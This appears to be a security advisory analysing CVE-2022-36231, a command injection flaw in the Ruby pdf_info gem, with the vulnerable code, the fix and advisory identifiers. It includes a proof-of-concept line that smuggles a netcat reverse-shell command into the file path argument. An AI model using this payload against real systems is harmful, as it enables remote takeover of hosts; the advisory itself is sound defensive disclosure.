**2. Vulnerability Details:**

*   **Root Cause:** The vulnerability stems from the lack of input sanitization on the `pdf_path` variable in the `PDF::Info` class constructor in the `pdf_info` Ruby gem. This unsanitized path is later used in a system command, allowing for command injection.
*   **Weaknesses/Vulnerabilities Present:** The primary weakness is the direct use of user-supplied input in a system call without proper escaping or sanitization. The vulnerable code snippet is within the `command` method:
    ```ruby
    output = `#{self.class.command_path} -enc UTF-8 -f 1 -l -1 "#{@pdf_path}" 2> /dev/null`
    ```
    This allows an attacker to inject arbitrary OS commands by using command chaining techniques like `;` within the `pdf_path`.
*   **Impact of Exploitation:** An attacker can achieve arbitrary OS command execution on the system where the vulnerable `pdf_info` gem is used. This can lead to a complete compromise of the affected system. As shown in the provided content, it is possible to establish a reverse shell using this vulnerability.
*   **Attack Vectors:**
    *   The vulnerability can be exploited by passing a malicious string containing OS commands via the `pdf_path` parameter when creating an instance of the `PDF::Info` class.
    *   The user has to call the `metadata` method for the vulnerable code to execute.
*   **Required Attacker Capabilities/Position:**
    *   The attacker needs to be able to control or manipulate the `pdf_path` argument that is passed when creating a `PDF::Info` object.
    *   The attacker can exploit this vulnerability remotely if they are able to trigger the vulnerable code path through a vulnerable application or service.

**3. Technical Details & Description:**

*   The `pdf_info` gem is a Ruby wrapper around the `pdfinfo` command-line utility.
*   The vulnerability lies in how the gem constructs and executes the system call to the `pdfinfo` binary. The code uses backticks which are known to be susceptible to command injection.
*   The `initialize` method of the `PDF::Info` class accepts a `pdf_path` parameter without any validation.
*   The `metadata` method utilizes the unsanitized `pdf_path` to execute a system call.
*   A proof-of-concept exploit was created to demonstrate the vulnerability: `info = PDF::Info.new('pdf/sample1.pdf; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444>/tmp/f)')`

**4. Fix Information:**

*   The fix for this vulnerability involves using `Open3.capture3` to execute the system command instead of using backticks. This prevents command injection because `Open3` handles command arguments as an array and therefore sanitizes input automatically.
*   The patch is available in [Pull Request #15](https://github.com/newspaperclub/pdf_info/pull/15)

**5. Additional Notes:**
*   The vulnerability was reported to the vendor via email.
*   The vulnerability is assigned CVE-2022-36231.
*   The GitHub Security Advisory Database also assigned the vulnerability a GHSA-9fh3-j99m-f4v7.
*   The vulnerable versions are `pdf_info <= 0.5.3`.
*   The vulnerability has a CVSS v3 base score of 9.8
*   The vulnerability is classified as a CWE-94 (Improper Control of Generation of Code).

In summary, CVE-2022-36231 is a critical vulnerability due to the potential for remote code execution. The root cause is the lack of input sanitization in the `pdf_info` Ruby gem. The fix involves moving from backticks to `Open3.capture3`.
